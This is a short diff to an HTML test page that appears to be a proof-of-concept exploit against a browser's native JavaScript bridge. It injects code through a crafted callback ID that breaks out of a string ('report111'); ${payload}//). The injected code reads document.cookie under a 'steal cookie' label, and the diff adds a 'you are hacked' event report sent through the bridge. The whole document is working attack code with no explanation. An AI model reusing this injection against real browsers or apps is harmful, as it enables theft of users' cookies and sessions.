@@ -5,7 +5,14 @@
 <script>        
     const payload = `console.log('cloudx steal cookie : '+document.cookie)`;
     const callbackId = `report111'); ${payload}//`;   
-    window._hwbrNative.invoke('report', 'eventReport', callbackId, '', -1);        
+    window._hwbrNative.invoke('report', 'eventReport', callbackId, [JSON.stringify({
+            eventName: 'you are hacked',
+            version:1,
+            info:{extInfo:{'name':'cc'},u:'hahaha'},
+            reportImmediately:true,
+            isOverseaReport:false,
+            isAnonymous:true
+        })], -1);        
  </script>
 </body>
 </html>
